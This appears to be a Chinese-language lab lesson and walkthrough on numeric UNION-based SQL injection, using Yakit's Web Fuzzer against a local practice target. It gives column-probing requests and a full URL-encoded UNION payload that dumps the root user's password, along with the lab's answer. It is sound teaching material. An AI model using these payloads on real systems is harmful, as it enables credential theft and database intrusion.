---
title: UNION 注入：把数据库拖出来
difficulty: apprentice
---

# UNION 注入：把数据库拖出来

## 原理背景

数字型注入是 SQL 注入里最"干净"的形态：参数被直接拼进语句，连引号都不用闭合。

```sql
select * from vulin_users where id = 1
```

把 `id` 换成 `1 UNION SELECT ...`，就能把**任意查询的结果**追加到原结果集里——查管理员密码、查表结构、查别的表，全凭一条 UNION。约束只有两条：

1. UNION 两侧**列数**必须一致——先用 `ORDER BY n` 或 `UNION SELECT 1,2,...` 探测；
2. 让原查询返回空（如 `id=-1`），页面才会显示 UNION 的结果。

本题靶场的用户表 `vulin_users` 共 **9 列**：`id, created_at, updated_at, deleted_at, username, password, age, role, remake`（前四列是 ORM 框架自动加的主键与时间戳列）。

## Yakit 操作步骤

全程 Web Fuzzer（请求是简单 GET，MITM 抓首页请求后"发送到 Web Fuzzer"亦可；`Host` 头只写 `主机:端口`）：

1. 构造 `GET /user/id?id=1` 观察正常响应——页面把查询结果按 JSON 渲染（`username`、`password`、`age`、`role` 等字段），这就是 UNION 结果将出现的位置；
2. 逐个发探测请求：`?id=1 ORDER BY 9`（正常）、`?id=1 ORDER BY 10`（报错）——报错与正常的交界处就是列数；也可以直接用 `?id=-1 UNION SELECT 1,2,3,4,5,6,7,8,9` 对齐试探；
3. 把数字换成真正的目标查询（列的位置对应 `vulin_users` 的列序）；
4. URL 里的空格、引号等特殊字符要编码——空格 `%20`、单引号 `%27`、等号 `%3D`（Codec 一键处理，或直接抄下面的编码版）。

要批量试 payload 时，在 Fuzzer 里把注入点写成 fuzztag（如 `id=-1 UNION SELECT {{payload}}` 配合字典），一次执行生成整组请求——手工探测和理解原理，fuzztag 提效，先慢后快。

## 开始实战

点击 **前往配套题目练习**，启动环境后：探测 `/user/id` 的列数（9 列），构造负数 id + UNION 查询读出 `username='root'` 那一行的密码列，提交密码原文即通关。

<details>
<summary>📋 详细步骤（点击展开，照做即可拿到答案）</summary>

以下以实例地址 `http://127.0.0.1:36870` 为例——**端口每次启动环境都随机分配，请替换成你题目页显示的端口**。

**第 1 步：启动实验环境**

题目详情页点「启动实验环境」，等状态 running，复制访问地址（形如 `http://127.0.0.1:36870`）。

**第 2 步：观察正常响应**

```http
GET /user/id?id=1 HTTP/1.1
Host: 127.0.0.1:36870
```

页面把查到的用户渲染成 JSON（在响应里搜 `username` 可见）：

```json
[{"id":1,"username":"admin","password":"admin","age":25,"role":"admin",...}]
```

**第 3 步：探测列数**

把 `id` 换成 `1 ORDER BY 9`（URL 编码后）：

```http
GET /user/id?id=1%20ORDER%20BY%209 HTTP/1.1
Host: 127.0.0.1:36870
```

正常返回 admin 的数据；再试 `ORDER BY 10`（`?id=1%20ORDER%20BY%2010`），响应变为 SQLite 报错（`1st ORDER BY term out of range`）——列数就是 9。

**第 4 步：UNION 拖出 root 的密码**

负数 id 让原查询空结果，UNION 按 `vulin_users` 的 9 列列序对位（编码版可直接照抄）：

```http
GET /user/id?id=-1%20UNION%20SELECT%20id,created_at,updated_at,deleted_at,username,password,age,role,remake%20FROM%20vulin_users%20WHERE%20username%3D%27root%27 HTTP/1.1
Host: 127.0.0.1:36870
```

响应里的 JSON：

```json
[{"id":2,"username":"root","password":"p@ssword","age":53,...}]
```

密码列的值就是答案。

**第 5 步：提交答案**

回到题目详情页，提交 `p@ssword`。

</details>

## 延伸：验证与自动化

- **数据库客户端**：Yakit 工具集自带数据库连接能力，等你在后续题目拿到更多数据时可以直接连库核对；
- **漏洞检测**：对靶机跑一次主动扫描，观察 SQL 注入规则能否自动命中 `/user/id`——把它报的位置与你手工找到的注入点对照，感受自动化覆盖面；
- URL 编码遇到麻烦时随时开 **Codec**。

下一课：真实注入点往往裹着引号和括号——学会拆"包装纸"。
